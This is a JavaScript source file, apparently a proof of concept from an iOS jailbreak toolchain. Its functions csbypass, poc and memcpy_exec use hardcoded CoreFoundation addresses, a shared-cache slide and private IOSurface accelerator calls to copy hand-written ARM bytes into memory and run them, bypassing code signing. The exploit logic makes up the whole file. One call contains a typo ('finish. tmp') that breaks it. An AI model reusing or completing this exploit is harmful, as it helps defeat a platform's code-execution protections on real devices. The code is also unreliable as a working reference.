var RTLD_NOW = 2;
var PAGE_SIZE = 0x1000;

var CFDictionaryCreateMutable_addr = 0x20809ae1;
var kCFTypeDictionaryKeyCallBacks_addr = 0x343c79cc;
var kCFTypeDictionaryValueCallBacks_addr = 0x343c79fc;
var CFDictionarySetValue_addr = 0x2080a791;
var CFNumberCreate_addr = 0x2080bc79;
var kCFNumberSInt32Type = 3;
var CFShow_addr = 0x208e897c | 1;

var my_kIOSurfaceBytesPerRow;
var my_kIOSurfaceWidth;
var my_kIOSurfaceHeight;
var my_kIOSurfacePixelFormat;
var kCFAllocatorDefault;

function csbypass() {
	printf("hello from csbypass!\n");
	poc();
}

function memcpy_exec(dst, src, size) {
	var dict = NULL;
	var accel = malloc(4);
	var width = malloc(4);
	var height = malloc(4);
	var pitch = malloc(4);
	var pixel_format = malloc(8);
	write_u32(width, PAGE_SIZE / (16 * 4));
	write_u32(height, 16);
	write_u32(pitch, read_u32(width) * 4);
	write_u32(pixel_format, 0x42475241); // ARGB
	write_u32(pixel_format + 4, 0x0); // ARGB
	printf("%x %x\n", CFDictionarySetValue_addr + get_dyld_shc_slide(), dlsym(dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW), "CFDictionarySetValue"));
	dict = CFDictionaryCreateMutable(0, 0, kCFTypeDictionaryKeyCallBacks_addr + get_dyld_shc_slide(), kCFTypeDictionaryValueCallBacks_addr + get_dyld_shc_slide());
	printf("dict: %p\n", dict);
	callnarg(CFShow_addr + get_dyld_shc_slide(), dict);
	CFDictionarySetValue(dict, read_u32(my_kIOSurfaceBytesPerRow), CFNumberCreate(read_u32(kCFAllocatorDefault), kCFNumberSInt32Type, pitch));
	CFDictionarySetValue(dict, read_u32(my_kIOSurfaceWidth), CFNumberCreate(read_u32(kCFAllocatorDefault), kCFNumberSInt32Type, width));
	CFDictionarySetValue(dict, read_u32(my_kIOSurfaceHeight), CFNumberCreate(read_u32(kCFAllocatorDefault), kCFNumberSInt32Type, height));
	CFDictionarySetValue(dict, read_u32(my_kIOSurfacePixelFormat), CFNumberCreate(read_u32(kCFAllocatorDefault), kCFNumberSInt32Type, pixel_format));
	printf("%d\n", callnarg(my_IOSurfaceAcceleratorCreate, 0, 0, accel));
	printf ("you can kill me now\n");
}

function linkIOSurface() {
	h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_NOW);
    
    my_kIOSurfaceBytesPerRow = dlsym(h, "kIOSurfaceBytesPerRow");
    my_kIOSurfaceWidth = dlsym(h, "kIOSurfaceWidth");
    my_kIOSurfaceHeight = dlsym(h, "kIOSurfaceHeight");
    my_kIOSurfacePixelFormat = dlsym(h, "kIOSurfacePixelFormat");

	scall("printf", "%x %x %x %x\n", my_kIOSurfaceBytesPerRow, my_kIOSurfaceWidth, my_kIOSurfaceHeight, my_kIOSurfacePixelFormat);

    my_IOSurfaceAcceleratorCreate = dlsym(h, "IOSurfaceAcceleratorCreate");
    my_IOSurfaceCreate = dlsym(h, "IOSurfaceCreate");
    my_IOSurfaceAcceleratorTransferSurface = dlsym(h, "IOSurfaceAcceleratorTransferSurface");

	CFDictionarySetValue_addr = dlsym(dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW), "CFDictionarySetValue") - get_dyld_shc_slide();
	kCFAllocatorDefault = dlsym(dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW), "kCFAllocatorDefault");

	scall("printf", "%x %x %x\n", my_IOSurfaceAcceleratorCreate, my_IOSurfaceCreate, my_IOSurfaceAcceleratorTransferSurface);
}

function poc() {
	linkIOSurface();

	var tmp = malloc(0x4000);
	var start = [0x4F, 0xF0, 0x82, 0x40, 0x00, 0x47];

	for (var i = 0; i < start.length; i++) {
		write_u8(tmp + i, start[i]);
	}

	var finish = 0x10000;

	memcpy_exec(finish. tmp, 0x1000);

	scall("printf", "%x %x %x %x %x %x %x %x %x %x %x %x %x\n", h, my_kIOSurfaceBytesPerRow, my_kIOSurfaceWidth, my_kIOSurfaceHeight, my_kIOSurfacePixelFormat, my_IOSurfaceAcceleratorCreate, my_IOSurfaceCreate, my_IOSurfaceAcceleratorTransferSurface, 0x41414141);

//	var finish = 
}